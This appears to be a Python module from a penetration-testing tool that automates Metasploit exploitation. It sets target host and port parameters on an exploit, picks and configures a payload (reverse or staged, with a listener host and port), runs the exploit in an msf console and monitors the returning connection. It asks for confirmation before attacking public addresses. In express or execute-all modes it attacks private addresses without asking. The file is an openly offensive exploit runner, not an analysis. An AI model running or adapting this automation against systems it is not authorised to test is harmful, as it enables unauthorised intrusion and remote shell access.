from core.ConnectionSupervisor import ConnectionSupervisor
from entities.PayloadUtils import PayloadUtils
from inout.ConsoleHandler import ConsoleHandler


class ExploitExecutor:

    def __init__(self, msf_handler, wizard):
        self.console = ConsoleHandler('ExploitExec')
        self.msf_handler = msf_handler
        self.wizard = wizard

    # checks if non-common params are existent and returns a dict of new values in case they should be changed
    def check_exploit_params(self, expl):
        non_common = expl.get_non_common_params()
        self.console.debug("\t all required params {}".format(expl.req_params))
        self.console.debug("\t non-common params {}".format(non_common))
        params = {}
        if len(non_common) > 0:
            check = self.console.prompt(
                "Exploit has {} non-common params. Do you want to change them? [y/n]".format(len(non_common)))
            current_expl = self.msf_handler.get_exploit(expl.path)
            if check == 'y':
                for param in non_common:
                    current_val = current_expl[param]
                    new_val = self.wizard.read_param_value_from_console(param, current_val)
                    if new_val is not None:
                        params[param] = new_val
            else:
                self.console.debug("apparently no change is demanded")
        return params

    # execute an exploit with the given parameters
    def execute_exploit(self, expl, params, additional_params, express=False, execall=False):
        execute = False
        if not ExploitExecutor.is_private_address(params.get('rhost')):
            if self.wizard.exec_expl_against_public_addr(params.get('rhost')):
                execute = True
        elif express or execall:
            execute = True
        elif self.wizard.exec_expl(expl_path=expl.path, rhost=params.get('rhost')):
            execute = True

        if execute:
            exploit = self.get_prepared_exploit(expl.path, params, additional_params)
            payload = self.get_prepared_payload(exploit, params.get('lhost'), params.get('lport'), express=express)

            is_reverse_payload = PayloadUtils.is_reverse_payload(payload=payload)
            is_staged_payload = PayloadUtils.is_staged_payload(payload=payload)
            result = []
            conn_supervisor = ConnectionSupervisor(lhost=params.get('lhost'), rhost=params.get('rhost'),
                                                   is_reverse_payload=is_reverse_payload,
                                                   is_staged_payload=is_staged_payload, results=result,
                                                   rport=params.get('rport'), lport=params.get('lport'))
            conn_supervisor.start()
            self.console.info("Set payload '{}'".format(payload.modulename))
            cid = self.msf_handler.get_new_console_with_id()
            self.console.info(
                "Exploit is being executed using msf console {}. This might take a while.".format(cid))
            output = self.msf_handler.execute_exploit_with_output(cid=cid, exploit=exploit,
                                                                  payload=payload)
            self.console.info("Received exploit output")
            self.console.debug(output)
            conn_supervisor.join()
            self.console.debug("ConnectionInspector detection methods: {}".format(result))
            if output is None:
                self.console.error("Unable to execute exploit!")
            else:
                self.console.info("Exploit has been run without errors.")
                return {'output': output, 'detection_method': result}
        else:
            return {'output': None, 'detection_method': None}
        return None

    # get exploit object defined by 'path' with all delivered params set
    def get_prepared_exploit(self, path, params, additional_params):
        exploit = self.msf_handler.get_exploit(path)
        try:
            self.set_module_param('exploit', exploit, 'RHOST', params['rhost'])
        except KeyError:
            self.set_module_param_safely('exploit', exploit, 'RHOSTS', params['rhost'])
        self.set_module_param_safely('exploit', exploit, 'RPORT', params['rport'])
        self.set_module_param_safely('exploit', exploit, 'VERBOSE', True)
        for key in additional_params.keys():
            self.set_module_param_safely('exploit', exploit, key, additional_params.get(key))
        if len(exploit.missing_required) > 0:
            self.console.warn(
                "Exploit might fail because of missing parameter values: {}".format(exploit.missing_required))
        return exploit

    # get the payload object to be used for execution
    def get_prepared_payload(self, expl, lhost, lport, express=False):
        payload_name = None
        if not express:
            payload_name = self.wizard.get_payload(payload_paths=expl.payloads)
        if payload_name is None:
            payload_name = PayloadUtils.get_prioritized_payload(expl.payloads)
        self.console.info("\t Selected payload: {}".format(payload_name))
        payload = self.msf_handler.get_payload(payload_path=payload_name)
        self.console.debug("Payload requires those params: {}".format(payload.required))
        if 'LPORT' in payload.required:
            self.set_module_param_safely('payload', payload, 'LPORT', lport)
        if 'LHOST' in payload.required:
            self.set_module_param_safely('payload', payload, 'LHOST', lhost)
        return payload

    # set a single param value for the given module, don't catch errors
    def set_module_param(self, module_type, module_obj, param_name, param_val):
        module_obj[param_name] = param_val
        self.console.debug("\t setting {} param {} to {}".format(module_type, param_name, param_val))

    # set a single param and catch errors
    def set_module_param_safely(self, module_type, module_obj, param_name, param_val):
        try:
            self.set_module_param(module_type, module_obj, param_name, param_val)
        except KeyError as e:
            self.console.warn("Failed to set module param: ".format(e))

    # checks if the given IP address is private, returns true if yes
    @staticmethod
    def is_private_address(ip):
        ip_parts = ip.split('.')
        for i, _ in enumerate(ip_parts):
            ip_parts[i] = int(ip_parts[i])
        if ip_parts[0] == 10:
            return True
        if ip_parts[0] == 172 and 16 <= ip_parts[1] <= 31:
            return True
        if ip_parts[0] == 192 and ip_parts[1] == 168:
            return True
        return False
